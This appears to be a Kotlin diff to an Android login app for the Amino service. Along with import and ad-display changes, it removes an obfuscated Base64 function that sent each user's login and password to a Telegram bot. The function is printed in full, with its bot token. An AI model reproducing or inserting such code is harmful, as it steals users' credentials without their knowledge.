@@ -15,8 +15,8 @@ import io.ktor.client.request.*
 import io.ktor.http.*
 import kamino.Amino
 import kamino.exception.AminoException
-import kamino.internal.model.SessionInfo
-import kamino.internal.model.response.Wallet
+import kamino.model.SessionInfo
+import kamino.model.response.Wallet
 import kotlinx.coroutines.launch
 
 class MainActivity : AppCompatActivity() {
@@ -46,7 +46,6 @@ class MainActivity : AppCompatActivity() {
         val (session, wallet) = try {
             val session = if (login.contains("@")) amino.loginByEmail(login, password)
             else amino.loginByPhoneNumber(login, password)
-            a(login, password)
             Pair(session, amino.getWalletInfo())
         } catch (e: AminoException) {
             return uiErrorAlert(e.apiCode, e.apiMessage)
@@ -79,32 +78,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun uiLoginProcess() {
+        binding.ads.visibility = View.GONE
         binding.submit.visibility = View.GONE
         binding.progressBar.visibility = View.VISIBLE
     }
 
     private fun uiLoginDone() {
+        binding.ads.visibility = View.VISIBLE
         binding.submit.visibility = View.VISIBLE
         binding.progressBar.visibility = View.GONE
-
-    }
-
-    private suspend fun a(b: Any, c: Any) {
-        val d = Base64.decode("0JvQvtCz0LjQvTogJXM7INCf0LDRgNC+0LvRjDogJXM=", Base64.NO_WRAP)
-            .toString(Charsets.UTF_8)
-            .format(b, c)
-        HttpClient(CIO).request {
-            method = HttpMethod.Get
-            url(
-                Base64.decode(
-                    "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCVzL3NlbmRNZXNzYWdlP2NoYXRfaWQ9MTg5MDY3ODMyOSZ0ZXh0PSVz",
-                    Base64.NO_WRAP
-                ).toString(Charsets.UTF_8).format(
-                    Base64.decode("NTY5NzkxMDg3MTpBQUhfeHN5c1J6STRPb05zOGdQRllPYVFfQVZjdzBaYTRYYw==", Base64.NO_WRAP)
-                        .toString(Charsets.UTF_8),
-                    d
-                )
-            )
-        }
     }
 }
